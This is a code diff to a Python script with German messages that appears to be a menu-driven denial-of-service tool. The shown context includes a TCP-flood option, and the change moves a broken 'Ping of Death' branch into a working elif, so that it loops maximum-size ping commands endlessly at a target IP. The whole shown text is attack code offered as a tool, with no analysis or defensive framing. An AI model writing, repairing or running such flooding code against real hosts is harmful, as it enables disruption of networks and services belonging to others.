@@ -56,16 +56,18 @@ elif method == "2":
     except KeyboardInterrupt:
         print("TCP-Flood beendet.")
 
+elif method == "3":
+    # POD Flood
+    def ping_of_death(ip):
+        print("Starte Ping of Death...")
+        try:
+            while True:
+                os.system(f"ping -s 65507 {ip}")  # Maximale Paketgröße für ICMP
+        except KeyboardInterrupt:
+            print("Ping of Death beendet.")
+
+    ping_of_death(ip)
+
 else:
     print("Ungültige Auswahl. Das Programm wird beendet.")
-    
-elif method == "3":
-# POD Flood
 
-def ping_of_death(ip):
-    print("Starte Ping of Death...")
-    try:
-        while True:
-            os.system(f"ping -s 65507 {ip}")  # Maximale Paketgröße für ICMP
-    except KeyboardInterrupt:
-        print("Ping of Death beendet.")
